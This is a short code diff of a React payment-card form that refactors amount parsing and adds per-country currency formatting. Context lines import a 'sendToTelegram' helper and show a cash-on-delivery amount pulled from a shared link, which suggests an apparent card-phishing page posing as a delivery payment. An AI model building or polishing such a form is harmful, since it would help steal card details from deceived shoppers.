@@ -10,6 +10,8 @@ import { useLink } from "@/hooks/useSupabase";
 import { Shield, CreditCard, AlertCircle, ArrowLeft } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
+import { parseAmount } from "@/utils/amountParser";
+import { formatCurrency } from "@/lib/countryCurrencies";
 
 const PaymentCardForm = () => {
   const { id } = useParams();
@@ -32,20 +34,8 @@ const PaymentCardForm = () => {
   // Get amount from link data - ensure it's a number, handle all data types
   const rawAmount = shippingInfo?.cod_amount;
 
-  // Handle different data types and edge cases
-  let amount = 500; // Default value
-  if (rawAmount !== undefined && rawAmount !== null) {
-    if (typeof rawAmount === 'number') {
-      amount = rawAmount;
-    } else if (typeof rawAmount === 'string') {
-      const parsed = parseFloat(rawAmount);
-      if (!isNaN(parsed)) {
-        amount = parsed;
-      }
-    }
-  }
-
-  const formattedAmount = `${amount} ر.س`;
+  const amount = parseAmount(rawAmount, 500);
+  const formattedAmount = formatCurrency(amount, selectedCountry);
   
   const formatCardNumber = (value: string) => {
     const cleaned = value.replace(/\s/g, "");
